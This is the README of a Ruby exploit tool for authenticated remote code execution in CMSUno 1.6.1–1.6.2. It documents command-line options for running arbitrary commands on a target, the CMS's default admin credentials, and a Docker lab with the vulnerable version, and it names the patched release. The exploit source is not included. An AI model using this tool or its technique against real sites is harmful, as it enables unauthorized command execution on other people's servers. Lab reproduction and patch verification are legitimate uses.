# CMSUno RCE exploit

> CMSUno 1.6.1 <= 1.6.2 - Remote Code Execution (Authenticated)

Exploit for [CVE-2020-25557][CVE-2020-25557] and [CVE-2020-25538][CVE-2020-25538].

[[EDB-xxx](https://www.exploit-db.com/exploits/xxx)] [[PacketStorm](https://packetstormsecurity.com/files/xxx/xxx.html)] [[WLB-xxx](https://cxsecurity.com/issue/WLB-xxx)]

## Usage

```plaintext
$ ruby exploit.rb --help
CMSUno 1.6.1 <= 1.6.2 - Remote Code Execution (Authenticated)

Usage:
  exploit.rb -r <url> -c <cmd> [-u <username>] [-p <password>] [-t <tech>] [--debug]
  exploit.rb -H | --help

Options:
  -r <url>, --root-url <url>            Root URL (base path) including HTTP scheme, port and root folder
  -u <username>, --user <username>      user name (if not default: cmsuno)
  -p <password>, --pass <password>      User password (if not default: 654321)
  -c <cmd>, --command <cmd>             Command to execute on the target
  -t <tehc>, --technique <tech>         Technique: exploiting 'user' param (default, with output) or 'lang' param (blind)
  --debug                               Display arguments
  -h, --help                            Show this screen

Examples:
  exploit.rb -r http://example.org -c id
  exploit.rb -r https://example.org:5000/cmsuno -c 'touch hackproof' -u john -p admin1234 -t lang
```

## Requirements

- [httpclient](https://github.com/nahi/httpclient)
- [docopt.rb](https://github.com/docopt/docopt.rb)

Example for BlackArch:

```plaintext
pacman -S ruby-httpclient ruby-docopt
```

Example using gem:

```plaintext
gem install httpclient docopt
```

## Docker deployment of the vulnerable software

With docker-compose (recommended):

```shell
$ sudo docker-compose up --build
```

With docker alone (not recommended):

```shell
$ sudo docker build -t cmsuno:v1.6.2 --build-arg UNO_VERSION=1.6.2 -f Dockerfile .
$ sudo docker run -d -p 5000:80 --name cmsuno cmsuno:v1.6.2
```

Then access http://localhost:5000/uno.php with default credentials
`cmsuno` / `654321`.

## References

This is a better re-write & fusion of [EDB-49031][EDB-49031] and [EDB-48996][EDB-48996].

This is an exploit for the vulnerabilities found by [Fatih Çelik](https://fatihhcelik.blogspot.com) on [CMSUno](https://www.boiteasite.fr/cmsuno.html) (see details in comments of the exploit).

Exploit comparison:

This one | Original
-------- | --------
dynamic arguments | hardcoded arguments
command choice | hardcoded reverse shell (using `nc.traditional` available only on debian and not installed by default)
no crash / re-usable | trash the exploited file / can be used only once
command output (stdout) | no output
clean code | dirty code with many useless steps
exploitation technique choice (param used) | two distinct exploits with 95% LoC in common

Vulnerability explanation:

- ['user' param - targeting password.php](https://fatihhcelik.blogspot.com/2020/09/cmsuno-162-remote-code-execution.html)
- ['lang' param - targeting config.php](https://fatihhcelik.blogspot.com/2020/09/cmsuno-162-remote-code-execution_30.html)

Patch: Update to 1.6.3 or upper.

This exploit was tested with Ruby 2.7.2.

[CVE-2020-25557]:https://nvd.nist.gov/vuln/detail/CVE-2020-25557
[CVE-2020-25538]:https://nvd.nist.gov/vuln/detail/CVE-2020-25538
[EDB-49031]:https://www.exploit-db.com/exploits/49031
[EDB-48996]:https://www.exploit-db.com/exploits/48996